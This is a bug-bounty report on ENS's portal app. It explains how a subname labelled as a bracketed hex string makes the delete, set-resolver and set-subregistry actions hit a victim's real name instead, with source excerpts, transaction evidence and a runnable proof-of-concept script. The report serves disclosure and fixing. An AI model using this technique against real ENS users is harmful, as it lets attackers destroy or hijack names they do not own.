# 92411 w a critical incorrect labelhash resolution in portal leads to deletion of other unintended ens subnames and resolving hijacking of unintended&#x20;

**Submitted on Sep 9th 2026 at 14:54:08 UTC by @deltabear for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92411
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters Substituting contract addresses Submitting malicious transactions Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated) Inducing a blanket token approval (for example setApprovalForAll on the registry or NameWrapper) to an attacker-controlled address

## Description

## Brief/Intro

The Explorer's Subnames tab builds the delete transaction's argument from the row's label with viem's `labelhash()`, which decodes a `[<64 hex>]` string instead of hashing it. An attacker with `ROLE_REGISTRAR` registers one subname named `[<labelhash of a real label the operator owns>]` like `vault.victim.eth`. It renders as meaningless spam. When the operator deletes the junk row, the app signs `unregister(labelhash("vault"))` and destroys the real `vault` subname instead, while the junk row stays untouched and undeleted.

The same label-to-resource-id derivation feeds two further write paths in the same app. Those are under **Additional risk from the same root cause** below, so the fix can be scoped to all three at once. They are supplied for completeness.

## Vulnerability Details

`apps/portal/src/routes/$name/subnames.tsx:177-186` extracts the label shown on screen with a local `getLabel`, plain string slicing with no normalization step:

```ts
const getLabel = useCallback((subname: string) => {
  const suffix = `.${name}`
  if (subname.endsWith(suffix)) return subname.slice(0, -suffix.length)
  return subname.split('.')[0]
}, [name])
```

`runDelete` passes that label straight through `useDeleteSubname` into `deleteSubname` (`apps/portal/src/features/registry/helpers/deleteSubname.ts:50-55`) and `prepareDeleteSubnameTransaction` (`apps/portal/src/features/registry/utils/delete-subname.helpers.ts:33-39`), which hands it to ENSJS unmodified:

```ts
const writeParams = deleteSubnameWriteParameters(
  walletClient as Parameters<typeof deleteSubnameWriteParameters>[0],
  { registryAddress, label },
)
```

ENSJS computes the on-chain argument with `BigInt(labelhash(label))` (`@ensdomains/ensjs@e96662c dist/actions/wallet/v2/deleteSubname.js:13`). viem's `labelhash` (`viem@2.52.2 utils/ens/labelhash.js:14-19`) tries `encodedLabelToLabelhash()` first, which reads the 64 hex characters between `[` and `]` straight out, and only falls back to `keccak256` when that parse fails. The chain hashes the literal label string it receives at registration. A label written as `[23c14fceac7676b670aa56866076586ea1ce15ddcf19208ec6346cf748dffbee]` therefore has two identities: `keccak256` of the literal 66 character string on chain, and `labelhash("vault")` in the client, because that hex is `labelhash("vault")`.

No guard catches this, because nothing on the delete path ever checks the row's own resource. The Delete button renders on `hasUnregisterRole` (`subnames.tsx:105-114`), which is queried with `label: ''`:

```ts
const { data: hasUnregisterRole } = useQuery({
  ...getHasRolesQueryOptions({
    registryAddress: subregistryAddress as Address,
    label: '',
    roles: ['ROLE_UNREGISTER'],
    account: connectedAccount as Address,
  }),
```

### Vulnerable source code

**1. The label shown on screen, extracted with no normalization** @ `apps/portal/src/routes/$name/subnames.tsx:177-186`

```ts
const getLabel = useCallback((subname: string) => {
  const suffix = `.${name}`
  if (subname.endsWith(suffix)) return subname.slice(0, -suffix.length)
  return subname.split('.')[0]
}, [name])
```

**2. The label reaches ENSJS unmodified** @ `apps/portal/src/features/registry/utils/delete-subname.helpers.ts:33-39`

```ts
const writeParams = deleteSubnameWriteParameters(
  walletClient as Parameters<typeof deleteSubnameWriteParameters>[0],
  { registryAddress, label },
)
```

**3. ENSJS builds the argument by decoding, not hashing** @ `@ensdomains/ensjs@e96662c dist/actions/wallet/v2/deleteSubname.js:7-13`

```js
export const deleteSubnameWriteParameters = (client, { registryAddress, label }) => {
  return {
    address: registryAddress,
    abi: permissionedRegistryUnregisterSnippet,
    functionName: 'unregister',
    args: [BigInt(labelhash(label))],
  };
};
```

**4. viem tries the bracket decode before it ever hashes** @ `viem@2.52.2 utils/ens/labelhash.js:14-19`

```js
export function labelhash(label) {
  const result = new Uint8Array(32).fill(0);
  if (!label) return bytesToHex(result);
  return encodedLabelToLabelhash(label) || keccak256(stringToBytes(label));
}
```

**5. The Delete button's gate never looks at the row — it reads the root resource once, for every row** @ `apps/portal/src/routes/$name/subnames.tsx:105-114,370,377`

```ts
const { data: hasUnregisterRole } = useQuery({
  ...getHasRolesQueryOptions({
    registryAddress: subregistryAddress as Address,
    label: '',
    roles: ['ROLE_UNREGISTER'],
    account: connectedAccount as Address,
  }),
})
...
const canDeleteSubname = Boolean(hasUnregisterRole)
```

**6. The root grant list has six entries, and delete is not one of them** @ `apps/portal/src/lib/roles/permissions.ts:71-108`

```ts
export const registryRootPermissions: readonly RegistryRootPermission[] = [
  { key: 'ROLE_SET_SUBREGISTRY', ... },
  { key: 'ROLE_SET_RESOLVER', ... },
  { key: 'ROLE_RENEW', ... },
  { key: 'ROLE_REGISTRAR', ... },
  { key: 'ROLE_REGISTER_RESERVED', ... },
  { key: 'ROLE_SET_PARENT', ... },
] as const
```

**7. Registrar and Unregister are separate bits** @ `@ensdomains/ensjs@e96662c dist/utils/v2/roles/registryRoles.js:2,11`

```js
const ROLE_REGISTRAR = 1n << 0n;
const ROLE_UNREGISTER = 1n << 12n;
```

## Impact Details

An attacker can cause **"Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters"**, which is exactly the scoped impact, nowhere does the scope requires the attacker to be permissionless and from immunefi's rules on privilaged attackers: "Another exception may apply whereby impacts listed on the Impacts in Scope table can occur due to a logic error exploitable by a privileged address. Logic errors are considered valid bug reports." Here, a lower-level permissioned actor can take advantage of a logical error in the code to achieve the scoped impact exactly. Moreover, ENS registrant role isn't an admin, and can be taken advantage of, and has extremely high exploitability by bombing the name with junk subnames, and a single bulk delete will delete all real names without warning.

* When an admin deletes a junk subname, instead, the real name will be deleted and the junk remains. Example in the screenshots.
* Setting the resolver on a gifted subname redirects the resolver of the victim's real subname to an attacker-controlled address. tested end-to-end with screenshots
* Configuring the subregistry on a gift ed subname modifies the subregistry of the victim's real subname, orphaning all of its child subnames. tested end-to-end

## Additional risk from the same root cause

The defect above is not specific to deleting a subname. It is in how the app turns a **displayed label** into an **on-chain resource id**, and every write path that does so inherits it, including the role gate that is supposed to catch it. We reproduced two further paths against the same production build, each with its own mined transaction, and include them here so the fix is scoped to all three rather than to the Subnames tab alone.

**We are not claiming a separate impact row for either.** Both are reached from the page of a name the attacker gifted the victim, which is a materially weaker entry point than the Subnames tab: the victim has no pre-existing task that takes them there. They are supplied as blast radius, and as evidence that this bug does not depend on the registrar delegation at all.

### (a) `setResolver` — an attacker holding **zero** roles retargets the resolver of a real name

Full bundle in `extra-change-resolver/`. Commit `1c9b47f`, anvil fork of Sepolia, production Portal build on `wrangler dev`, the repo's own `@ensdomains/headless-web3-provider` e2e fixture, and **no indexer mock anywhere in this flow**.

The attacker registers an ordinary 2LD whose label is the literal 66-character string `"[" + hex(labelhash(V)) + "]"`, where `V` is a real name the victim owns — an ordinary paid registration, 8.000021 USDC, no permission of any kind. They push it to the victim with `safeTransferFrom` (tx `0x1e3b4fc5a730cca47e5e65126aa60077e081f1fbbadb4b1d450c44f3855e710b`), which needs no consent and no victim transaction.

`changeResolver.ts:70-77` takes the label off the raw route string and builds the write argument with ENSJS's `labelToCanonicalId`, which is `hexToBigInt(labelhash(label))` with the low 32 bits masked — the same viem decode. The role gate is the same function as in the delete path (`hasRoles.js`, `BigInt(labelhash(params.label))`), so it passes rather than blocking, and the app renders its own unprompted call to action on the gift's Resolver tab:

> "This name does not have a resolver set." **\[Set resolver]**

(`extra-change-resolver/evidence/screenshots/03-bracket-resolver-no-resolver-set.png`.) The victim clicks it, types an address, signs:

* tx `0xd1d051f2dd2c4fae2dc7d4ad26a4c0a08bbec0810c8b93578a1d472f625827f3`, block 11667082, to the **shared `.eth` registry** `0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2`
* calldata `0xbc7b6d62` + `1ec8b341…0000000` + the typed address; `arg0` == `canonicalId(V)` byte for byte, **not** the gift's own identity (`keccak256` of the bracket string, `0x588862c6…d0a4`)
* `V`'s resolver moves `0x23f45D32…14c2` -> `0x82c6f4E3…Bb50`; the gift's own resolver stays `0x0`, never touched
* the victim's **real** name's own Resolver tab then displays the wrong resolver under the correct label and namehash (`extra-change-resolver/evidence/screenshots/06-v-resolver-after-attack.png`)

Controls: the ordinary Change-resolver flow on an unrelated name of the victim's touches only that name (positive control); the attacker's own direct `setResolver(canonicalId(V), attacker)` **reverts** (negative control). Recovery is one ordinary transaction and the records survive, because `setResolver` moves a pointer rather than destroying data — this path is less damaging than the delete above, and is the one that shows the precondition can be nothing at all.

### (b) `setSubregistry` — the same collision on the Registry tab

`ConfigureRegistryForm.tsx:89` takes `name.split('.')[0]` and hands it to ENSJS `setSubregistry.js`, `BigInt(labelhash(label))`. Reproduced through the browser on the same stack: tx `0x19da10877ae687966bd14e9e051b7b24f40478c1720996bb2d0b4794c7058092`, block 11654500, `arg0` = `0x2e5a30f4…ab58cf5e`, which the registry canonicalises onto the victim's real `r42victimb2.eth` rather than the bracket name on screen. The real name's subregistry moved `0x693C1f80…7D26` -> `0xb388b0FB…4E74`, orphaning the subnames underneath it, while the bracket name's own subregistry slot stayed `0x0`.

## References

**The delete path**

* `apps/portal/src/routes/$name/subnames.tsx:177-186` - `getLabel`, no normalization
* `apps/portal/src/routes/$name/subnames.tsx:195-214` - `runDelete` passes `getLabel(subname.name)` to `deleteSubnameAsync`
* `apps/portal/src/features/registry/hooks/useDeleteSubname.ts:79-90` - mutation wrapper, calls the pure helper
* `apps/portal/src/features/registry/helpers/deleteSubname.ts:50-55` - calls `prepareDeleteSubnameTransaction`
* `apps/portal/src/features/registry/utils/delete-subname.helpers.ts:33-39` - calls ENSJS `deleteSubnameWriteParameters` with the raw label
* `@ensdomains/ensjs@e96662c dist/actions/wallet/v2/deleteSubname.js:7-13` - `args: [BigInt(labelhash(label))]`
* `viem@2.52.2 utils/ens/labelhash.js:14-19` - bracket decode tried before `keccak256`
* `viem@2.52.2 utils/ens/encodedLabelToLabelhash.js:1-14` - the `[<64 hex>]` parse

**The gate that does not catch it**

* `apps/portal/src/routes/$name/subnames.tsx:105-114` - `hasUnregisterRole` is queried with `label: ''`, i.e. the root resource, never the row's own
* `apps/portal/src/routes/$name/subnames.tsx:370,377,388-389` - that single boolean becomes `canDelete` on every row in the table
* `@ensdomains/ensjs@e96662c dist/actions/public/v2/hasRoles.js:64-70` - `BigInt(labelhash(params.label))`; with `label: ''` viem returns `0x00…0`, so the check resolves to `ROOT_RESOURCE`

**ENS's documented role model, which this crosses**

* `RegistryRolesLib` / ENSJS `dist/utils/v2/roles/registryRoles.js:1-11` - `ROLE_REGISTRAR` nybble 0, "authorizes registering and reserving new names. Root only."; `ROLE_UNREGISTER` nybble 3, "authorizes unregistering names. Root or token."
* ENS v2 contracts documentation, Registry Roles - `ROLE_REGISTRAR` is root-only "because the resource (name) doesn't exist yet at registration time", with the ETH Registrar Controller as its worked example of a holder; `ROLE_UNREGISTER` is root-or-token with a "moderator" or "operator" as its worked examples
* <https://x.com/ensdomains/status/2093319579321999673>
* <https://ens.domains/blog/post/ensv2-architecture>

**The role boundary**

* `apps/portal/src/lib/roles/permissions.ts:71-108` - `registryRootPermissions`, six entries, no `ROLE_UNREGISTER`
* `apps/portal/src/features/registry/components/v2/RegistryAddUserSheet.tsx:122-130` - the real "Add User" grant call
* `apps/portal/src/features/registry/helpers/grantRegistryRoles.ts:45,62-70` - `resource: ROOT_RESOURCE`, no allowlist
* `@ensdomains/ensjs@e96662c dist/utils/v2/roles/registryRoles.js:2,11` - `ROLE_REGISTRAR = 1<<0`, `ROLE_UNREGISTER = 1<<12`

**Source for the two additional write paths**

* `apps/portal/src/features/resolver/helpers/changeResolver.ts:70-77` - `name.split('.')[0]` -> `labelToCanonicalId`
* `@ensdomains/ensjs dist/utils/v2/registry/labelToCanonicalId.js:3-7` - `hexToBigInt(labelhash(label))`, low 32 bits masked
* `apps/portal/src/features/registry/components/v2/ConfigureRegistryForm.tsx:89` - `name.split('.')[0]` -> ENSJS `setSubregistry`
* `apps/portal/src/utils/token/getLabel.ts:10-19` - the normalizing accessor that already exists and throws on `[`, which none of the three write paths call

## Proof of Concept

## Proof of Concept

## impact: When an admin deletes a junk subname, instead, the real name will be deleted and the junk remains. Example in the screenshots.

shows prrof after running end-to-end.

screenshots explanations:

6 - showing all names 7 - showing deleting a real name 8 - showing deleting the junk name: it seems like the junk name is deleted and the real name remains but its not true at all 9 - after a refresh you can see the real is adctually the deleted one, and the junk name remains undeleted results: the vault name is deleted.

Loads the repo's own `permissions.ts` and the pinned ENSJS write-parameter builders unmodified, replays the exact grant and delete calldata against a compiled model of the registry's role gate, and checks the delete calldata byte for byte against the real mined transaction above.

```bash
node poc.mjs
```

### poc.mjs

```js
#!/usr/bin/env node
//
// ENS PoC: apps/portal's Subnames-tab Delete action builds its on-chain
// argument with viem's labelhash(), which DECODES a "[<64 hex>]" label
// instead of hashing it. A subname named "[<labelhash of "vault">]" looks
// like meaningless spam on screen, but clicking Delete on it sends
// unregister(labelhash("vault")) and destroys a different, real subname the
// operator owns.
//
//   node poc.mjs                 (ENS_REPO defaults to ../../../ens-apps)
//
// Self-contained. On first run it writes its helpers to a temp dir, installs
// pinned deps there, and re-execs itself. No wallet, no RPC, no fork needed
// to run this script.
//
// LAYER A is the repo's OWN role list (apps/portal/src/lib/roles/permissions.ts)
// and the ENSJS write-parameter builders the app calls to build both the
// grant transaction and the delete transaction
// (@ensdomains/ensjs/wallet/v2, pinned to the exact commit this repo's
// pnpm-workspace.yaml catalog names, e96662c), loaded and run unmodified.
// Nothing here reimplements labelhash or the write-parameter builders.
//
// LAYER B is a compiled Solidity model of the v2 registry's role gate and
// register/unregister state transitions (the real contracts are audited
// separately and out of scope). Every constant it uses (role bit positions,
// the ROLES_ALL bitmap a registry deployer receives) is read from this
// repo's own source, cited at each use.
//
// CORROBORATION: this exact mechanism was already run once through the real
// rendered Portal (production build, apps/portal/dist, on wrangler dev) on
// an anvil fork of live Sepolia, with a real injected-wallet click on the
// real Delete button. Mined tx
// 0xdf82d27a6bb86c80b146c767fa2aee0286f361862f8708de3249a62d0a7601aa, block
// 11665247, calldata
// 0xa02b161e23c14fceac7676b670aa56866076586ea1ce15ddcf19208ec6346cf748dffbee.
// Full detail: evidence/FORENSICS.txt, evidence/screenshots/06 through 09,
// RESULTS.md. ACT 8 below recomputes that same calldata from the real
// ENSJS write-parameter builder and checks it byte for byte.

import { spawnSync } from 'node:child_process'
import { copyFileSync, existsSync, mkdirSync, readFileSync, writeFileSync } from 'node:fs'
import { createRequire } from 'node:module'
import os from 'node:os'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

const HERE = path.dirname(fileURLToPath(import.meta.url))
const REPO = process.env.ENS_REPO ?? path.resolve(HERE, '../../../ens-apps')
const WORK = process.env.POC_WORKDIR ?? path.join(os.tmpdir(), 'ens-poc-subname-delete-decode')

// ---------------------------------------------------------------- cast
// The real anvil default-mnemonic accounts used in the browser-driven run
// this PoC corroborates (evidence/FORENSICS.txt).
const VICTIM = '0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266'
const ATTACKER = '0x70997970C51812dc3A010C7d01b50e0d17dc79C8'
const VICTIM_RESOLVER = '0x0671d0CAA4d0641193b43081FDff1dBab2f7C9b9'

// ============================================================== generated files

const PKG = `{
  "name": "ens-poc-subname-delete-decode",
  "private": true,
  "type": "module",
  "dependencies": {
    "@ensdomains/ensjs": "https://pkg.pr.new/ensdomains/ensjs/@ensdomains/ensjs@e96662c",
    "@ensdomains/ensjs-abi": "https://pkg.pr.new/ensdomains/ensjs/@ensdomains/ensjs-abi@e96662c",
    "@ethereumjs/common": "^4.4.0",
    "@ethereumjs/evm": "^3.1.0",
    "@ethereumjs/statemanager": "^2.4.0",
    "@ethereumjs/util": "^9.1.0",
    "solc": "0.8.28",
    "viem": "2.52.2"
  },
  "devDependencies": { "tsx": "^4.19.2" }
}
`

// Lets the repo's own source run unmodified against these pinned deps,
// without installing the pnpm monorepo and without editing a line of target.
const LOADER = `import path from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'

const HERE = path.dirname(fileURLToPath(import.meta.url))
const ANCHOR = pathToFileURL(path.join(HERE, 'poc.mjs')).href
const REPO = process.env.ENS_REPO

const isBare = (s) => !s.startsWith('.') && !s.startsWith('/') && !s.includes(':')

// path.relative is WRONG across drives on Windows (G: vs C:); it returns an
// absolute path, which would make every node_modules file count as a repo file.
const REPO_PREFIX = path.resolve(REPO).toLowerCase() + path.sep
const isRepoFile = (parentURL) => {
  if (!parentURL || !parentURL.startsWith('file:')) return false
  try {
    return path.resolve(fileURLToPath(parentURL)).toLowerCase().startsWith(REPO_PREFIX)
  } catch { return false }
}

export async function resolve(specifier, context, nextResolve) {
  if (specifier.startsWith('@ens-repo/'))
    return nextResolve(pathToFileURL(path.join(REPO, specifier.slice(10))).href, context)
  // repo files resolve bare imports (viem, @ensdomains/ensjs/utils/v2 types)
  // against THIS PoC's own pinned node_modules, so both sides share one
  // module instance.
  if (isRepoFile(context.parentURL) && isBare(specifier))
    return nextResolve(specifier, { ...context, parentURL: ANCHOR })
  return nextResolve(specifier, context)
}
`

const REGISTER = `import { register } from 'node:module'
register('./_loader.mjs', import.meta.url)
`

// LAYER B. The v2 contracts are audited separately and are not in the
// in-scope repo, so this models only what the impact depends on. Every
// constant is read from this repo's own source, not invented:
//   ROLE_REGISTRAR = 1<<0, ROLE_UNREGISTER = 1<<12, admin = role<<128
//     -> node_modules/.../ensjs/dist/utils/v2/roles/registryRoles.js:2,11
//   a registry deployer holds every role at ROOT (the 0x1111...1 bitmap)
//     -> apps/portal/src/features/registry/utils/create-subname.helpers.ts:21-23
//   unregister requires ROLE_UNREGISTER on the resource or on ROOT, clears
//   owner and resolver, and leaves the subregistry and deeper subnames
//   untouched -> ensjs dist/actions/wallet/v2/deleteSubname.js docblock
const SOL = `// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

contract PermissionedRegistryModel {
    uint256 constant ROLE_REGISTRAR = 1 << 0;
    uint256 constant ROLE_UNREGISTER = 1 << 12;
    uint256 constant ADMIN_SHIFT = 128;

    // resource => account => bitmap. resource 0 is ROOT_RESOURCE; a ROOT role
    // authorizes the holder on every resource (EnhancedAccessControl's root
    // fallback), mirrored below.
    mapping(uint256 => mapping(address => uint256)) public roleBits;
    mapping(uint256 => address) public ownerOf;
    mapping(uint256 => address) public resolverOf;

    error Unauthorized(uint256 resource, address caller, uint256 needed);

    /// The registry deployer gets ROLES_ALL at ROOT, same as
    /// create-subname.helpers.ts's DEFAULT_ROLE_BITMAP / deploySubregistryWriteParameters.
    constructor(address deployer) {
        roleBits[0][deployer] = type(uint256).max;
    }

    function hasRoles(uint256 resource, uint256 roles, address account) public view returns (bool) {
        if (roleBits[0][account] & roles == roles) return true;
        return roleBits[resource][account] & roles == roles;
    }

    /// registryRootPermissions' grant entrypoint (RegistryAddUserSheet -> grantRegistryRoles.ts).
    function grantRootRoles(uint256 roleBitmap, address account) external {
        uint256 needed = roleBitmap << ADMIN_SHIFT;
        if (!hasRoles(0, needed, msg.sender)) revert Unauthorized(0, msg.sender, needed);
        roleBits[0][account] |= roleBitmap;
    }

    /// Setup only: seeds a name the victim already owns (e.g. "vault"),
    /// the same on-chain state "Create subname" produces.
    function seedOwned(uint256 resource, address owner_, address resolver_) external {
        ownerOf[resource] = owner_;
        resolverOf[resource] = resolver_;
    }

    /// The only thing ROLE_REGISTRAR authorizes: mint a label nobody holds yet.
    function register(uint256 resource, address owner_) external {
        if (!hasRoles(0, ROLE_REGISTRAR, msg.sender)) revert Unauthorized(0, msg.sender, ROLE_REGISTRAR);
        require(ownerOf[resource] == address(0), "already registered");
        ownerOf[resource] = owner_;
    }

    /// deleteSubname.js's on-chain target. Gated on ROLE_UNREGISTER alone.
    function unregister(uint256 anyId) external {
        if (!hasRoles(anyId, ROLE_UNREGISTER, msg.sender)) revert Unauthorized(anyId, msg.sender, ROLE_UNREGISTER);
        ownerOf[anyId] = address(0);
        resolverOf[anyId] = address(0);
    }
}
`

// ============================================================== bootstrap

if (process.env.ENS_POC_CHILD !== '1') {
  const line = '='.repeat(78)
  console.log(line)
  console.log('  ENS PoC: Subnames-tab Delete decodes a bracket label instead of')
  console.log('           hashing it, and destroys a different, real subname')
  console.log(`  repo:  ${REPO}`)
  console.log(`  build: ${WORK}`)
  console.log(line)

  if (!existsSync(path.join(REPO, 'apps', 'portal'))) {
    console.error(`\nERROR: ENS checkout not found at ${REPO}. Set ENS_REPO.`)
    process.exit(2)
  }

  mkdirSync(WORK, { recursive: true })
  writeFileSync(path.join(WORK, 'package.json'), PKG)
  writeFileSync(path.join(WORK, '_loader.mjs'), LOADER)
  writeFileSync(path.join(WORK, '_register.mjs'), REGISTER)
  writeFileSync(path.join(WORK, 'Model.sol'), SOL)
  copyFileSync(fileURLToPath(import.meta.url), path.join(WORK, 'poc.mjs'))

  if (!existsSync(path.join(WORK, 'node_modules', 'tsx', 'package.json'))) {
    console.log('\nInstalling pinned deps (viem 2.52.2, ensjs @e96662c, solc 0.8.28)...')
    const r = spawnSync('npx', ['--yes', 'pnpm@9', 'install', '--no-frozen-lockfile'],
      { cwd: WORK, stdio: 'inherit', shell: true })
    if (r.status !== 0) process.exit(r.status ?? 1)
  }

  const r = spawnSync(process.execPath,
    ['--import', 'tsx', '--import', './_register.mjs', 'poc.mjs'],
    { cwd: WORK, stdio: 'inherit',
      env: { ...process.env, ENS_POC_CHILD: '1', ENS_REPO: REPO, NODE_NO_WARNINGS: '1' } })
  process.exit(r.status ?? 1)
}

// ============================================================== layer A

const { registryRootPermissions } = await import(
  '@ens-repo/apps/portal/src/lib/roles/permissions.ts')
const { grantRolesWriteParameters, deleteSubnameWriteParameters } = await import(
  '@ensdomains/ensjs/wallet/v2')
const { decodeFunctionData, encodeFunctionData, keccak256, labelhash, stringToBytes } =
  await import('viem')

// A fake wallet client. Both write-parameter builders read only .chain/.account
// off it; neither performs an RPC call.
const client = { chain: { id: 11155111 }, account: { address: VICTIM } }

// ============================================================== EVM

const require_ = createRequire(import.meta.url)
const { Common, Hardfork } = await import('@ethereumjs/common')
const { EVM } = await import('@ethereumjs/evm')
const { DefaultStateManager } = await import('@ethereumjs/statemanager')
const { Account, Address, hexToBytes } = await import('@ethereumjs/util')

const compileModel = () => {
  const solc = require_('solc')
  const out = JSON.parse(solc.compile(JSON.stringify({
    language: 'Solidity',
    sources: { 'Model.sol': { content: readFileSync(path.join(WORK, 'Model.sol'), 'utf8') } },
    settings: { optimizer: { enabled: true, runs: 200 },
                outputSelection: { '*': { '*': ['abi', 'evm.bytecode.object'] } } },
  })))
  const fatal = (out.errors ?? []).filter((e) => e.severity === 'error')
  if (fatal.length) throw new Error(fatal.map((e) => e.formattedMessage).join('\n'))
  const c = out.contracts['Model.sol'].PermissionedRegistryModel
  return { abi: c.abi, bytecode: `0x${c.evm.bytecode.object}` }
}

const GAS = 30_000_000n
const addr = (a) => new Address(hexToBytes(a))

class RevertError extends Error {}

class Chain {
  constructor(evm, sm) { this.evm = evm; this.sm = sm }

  static async create() {
    const sm = new DefaultStateManager()
    return new Chain(await EVM.create({
      common: new Common({ chain: 1, hardfork: Hardfork.Shanghai }), stateManager: sm }), sm)
  }

  async fund(a, wei) {
    const acct = (await this.sm.getAccount(addr(a))) ?? new Account()
    acct.balance = wei
    await this.sm.putAccount(addr(a), acct)
  }

  async deploy(from, bytecode, abi, args = []) {
    const ctor = abi.find((x) => x.type === 'constructor')
    // Constructor args are ABI-encoded and appended raw (no selector) after
    // the bytecode; encodeFunctionData cannot take a constructor entry.
    const encoded = ctor && args.length
      ? bytecode + require_('viem').encodeAbiParameters(ctor.inputs, args).slice(2)
      : bytecode
    const res = await this.evm.runCall(
      { caller: addr(from), origin: addr(from), data: hexToBytes(encoded), gasLimit: GAS })
    if (res.execResult.exceptionError) throw new Error('deploy reverted')
    return res.createdAddress.toString()
  }

  /// Send PRE-ENCODED calldata, used to replay Layer A's real bytes verbatim.
  async raw({ from, to, data, abi, fn }) {
    const res = await this.evm.runCall({ caller: addr(from), origin: addr(from), to: addr(to),
      data: hexToBytes(data), gasLimit: GAS })
    const ex = res.execResult
    const ret = `0x${Buffer.from(ex.returnValue).toString('hex')}`
    if (ex.exceptionError) {
      let reason = `reverted ${ret.slice(0, 10)}`
      try {
        const d = require_('viem').decodeErrorResult({ abi, data: ret })
        reason = `${d.errorName}(${(d.args ?? []).map((a) =>
          typeof a === 'bigint' ? `0x${a.toString(16)}` : String(a)).join(', ')})`
      } catch {}
      throw new RevertError(reason)
    }
    const outs = abi?.find((x) => x.type === 'function' && x.name === fn)?.outputs
    if (!outs?.length) return undefined
    return require_('viem').decodeFunctionResult({ abi, functionName: fn, data: ret })
  }

  async send({ abi, fn, args = [], ...rest }) {
    return this.raw({ ...rest, abi, fn, data: encodeFunctionData({ abi, functionName: fn, args }) })
  }

  async call(opts) { return this.send({ ...opts, from: '0x' + '00'.repeat(19) + '01' }) }
}

// ============================================================== the run

const W = 78
const rule = (ch = '=') => console.log(ch.repeat(W))
const say = (s = '') => console.log(s)
const act = (n, t) => { say(); rule(); say(`  ${n}  ${t}`); rule() }
const kv = (k, v) => say(`    ${String(k).padEnd(30)} ${v}`)
const short = (h) => `${h.slice(0, 10)}...${h.slice(-6)}`

act('ACT 1', "viem's own labelhash() decodes a bracket label instead of hashing it")
const realVaultId = labelhash('vault')
kv('labelhash("vault")', realVaultId)
const bracketLabel = `[${realVaultId.slice(2)}]`
kv('bracket label built from it', bracketLabel)
const decodedFromBracket = labelhash(bracketLabel)
kv('labelhash(bracketLabel)', decodedFromBracket)
if (decodedFromBracket !== realVaultId) throw new Error('premise broken: bracket label does not decode to vault')
say()
say('  >> Identical. viem/utils/ens/labelhash.ts tries encodedLabelToLabelhash()')
say('     first, which reads the 64 hex characters between [ and ] straight')
say('     out, before it ever tries keccak256.')
say()
const realOnChainSpamId = keccak256(stringToBytes(bracketLabel))
kv('keccak256(bytes(bracketLabel))', realOnChainSpamId)
say('  >> Different. This is the value the CHAIN actually assigns the spam')
say('     row when the attacker registers it (LibLabel.id hashes the literal')
say('     string). The two identities of the same on-screen row diverge here.')
if (realOnChainSpamId === realVaultId) throw new Error('premise broken: hash collision')

act('ACT 2', "The registry's own root-role grant list has no unregister entry")
kv('registryRootPermissions.length', registryRootPermissions.length)
const keys = registryRootPermissions.map((p) => p.key)
say(`    keys                           ${keys.join(', ')}`)
if (registryRootPermissions.length !== 6) throw new Error('permissions.ts changed shape')
if (keys.includes('ROLE_UNREGISTER')) throw new Error('premise broken: root grant list now includes it')
say()
say('  >> This is the exact checkbox list the "Add User" sheet renders')
say('     (apps/portal/src/lib/roles/permissions.ts:71-108). A registry admin')
say('     can hand out these six roles at ROOT_RESOURCE. Delete authority is')
say('     not one of them.')

act('ACT 3', 'The real grant calldata: registryRootPermissions.REGISTRAR, ROOT_RESOURCE only')
const grantParams = grantRolesWriteParameters(client, {
  registryAddress: '0x0000000000000000000000000000000000000001',
  roles: ['ROLE_REGISTRAR'],
  account: ATTACKER,
  resource: 0n,
})
const grantData = encodeFunctionData({ abi: grantParams.abi, functionName: grantParams.functionName, args: grantParams.args })
const grantDecoded = decodeFunctionData({ abi: grantParams.abi, data: grantData })
kv('function', grantDecoded.functionName)
kv('roleBitmap', `0x${grantDecoded.args[0].toString(16)}`)
kv('account', grantDecoded.args[1])
if (grantDecoded.functionName !== 'grantRootRoles') throw new Error('wrong entrypoint')
if (grantDecoded.args[0] !== 1n) throw new Error('roleBitmap is not ROLE_REGISTRAR alone')
if (grantDecoded.args[1].toLowerCase() !== ATTACKER.toLowerCase()) throw new Error('grantee mismatch')
say()
say('  >> This is the real calldata RegistryAddUserSheet.tsx:122 -> grantRegistryRoles.ts')
say('     produces for one checked "Registrar" box. ROLE_REGISTRAR only.')

act('ACT 4', 'Local EVM: victim deploys the registry, seeds their real "vault" subname')
const c = compileModel()
const chain = await Chain.create()
for (const a of [VICTIM, ATTACKER]) await chain.fund(a, 10n * 10n ** 18n)
const registry = await chain.deploy(VICTIM, c.bytecode, c.abi, [VICTIM])
kv('PermissionedRegistryModel', registry)
await chain.send({ from: VICTIM, to: registry, abi: c.abi, fn: 'seedOwned', args: [realVaultId, VICTIM, VICTIM_RESOLVER] })
say('  vault.<name> seeded: owner = VICTIM, resolver = VICTIM_RESOLVER')
say('  (the same state "Create subname" produces; VICTIM holds ROLES_ALL at')
say('   ROOT from deploying this registry, including ROLE_UNREGISTER.)')

act('ACT 5', "The victim's real Add User click: replaying ACT 3's calldata")
await chain.raw({ from: VICTIM, to: registry, data: grantData, abi: c.abi })
const attackerHasRegistrar = await chain.call({ to: registry, abi: c.abi, fn: 'hasRoles', args: [0n, 1n, ATTACKER] })
const attackerHasUnregister = await chain.call({ to: registry, abi: c.abi, fn: 'hasRoles', args: [0n, 1n << 12n, ATTACKER] })
kv('hasRoles(ROOT, ROLE_REGISTRAR, attacker)', attackerHasRegistrar)
kv('hasRoles(ROOT, ROLE_UNREGISTER, attacker)', attackerHasUnregister)
if (!attackerHasRegistrar) throw new Error('grant did not land')
if (attackerHasUnregister) throw new Error('attacker got unregister, premise broken')

act('ACT 6', "CONTROL: the attacker's own unregister(vault) reverts")
let controlReverted = false
try {
  await chain.send({ from: ATTACKER, to: registry, abi: c.abi, fn: 'unregister', args: [realVaultId] })
} catch (e) {
  if (!(e instanceof RevertError)) throw e
  controlReverted = true
  say(`  ATTACKER.unregister(labelhash("vault")) -> REVERTED: ${e.message}`)
}
